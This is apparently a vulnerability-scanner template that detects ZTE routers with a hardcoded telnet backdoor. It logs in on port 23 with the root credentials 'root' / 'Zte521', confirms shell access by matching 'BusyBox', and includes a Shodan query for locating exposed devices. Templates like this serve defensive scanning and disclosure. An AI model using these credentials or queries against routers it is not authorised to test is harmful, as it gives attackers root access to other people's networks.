id: backdoored-zte
info:
  name: ZTE Router Panel - Detect
  author: its0x08
  severity: critical
  description: The ZTE Router Panel Detect tool found multiple ZTE routers that have
    a telnet-hardcoded backdoor account, which allows for unauthorized access and
    a root shell spawn.
  reference:
  - https://www.exploit-db.com/ghdb/7179
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-912
  metadata:
    verified: true
    shodan-query: http.html:"ZTE Corporation"
    impact: The impact of the backdoored ZTE router panel is that it creates a security
      vulnerability, allowing unauthorized access to the network and potentially compromising
      sensitive information.
    recommendation: It is recommended to either update the ZTE router panel software
      or replace the router altogether in order to prevent unauthorized access through
      the backdoor account.
  tags: edb,network,zte,telnet,backdoor,router
network:
- host:
  - '{{Hostname}}'
  - '{{Host}}:23'
  inputs:
  - data: "root\r\n"
  - data: "Zte521\r\n\r\n"
    read: 1024
  matchers:
  - type: word
    words:
    - BusyBox
  extractors:
  - type: regex
    regex:
    - '[A-Z]{1,}[0-9]{3,4}'
